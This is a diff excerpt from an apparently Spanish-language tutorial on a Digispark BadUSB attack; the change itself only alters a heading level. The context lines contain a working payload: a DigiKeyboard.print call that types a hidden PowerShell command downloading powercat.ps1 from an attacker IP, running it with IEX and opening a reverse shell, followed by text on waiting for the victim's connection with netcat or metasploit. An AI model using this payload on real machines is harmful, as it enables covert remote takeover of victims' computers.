@@ -176,7 +176,7 @@ A esto:
 DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
 ```
 
-## Esperar a la conexión
+### Esperar a la conexión
 Como ya sabrás, el atacante debe esperar la conexión del cliente, para esperar la conexión que generará la máquina víctima al conectarse el microcontrolador.
 
 Podemos esperar la conexión del atacante usando herramientas como `netcat` y `metasploit`. Para esperar a conexiones entrantes en `netcat` podríamos hacerlo de esta manera:
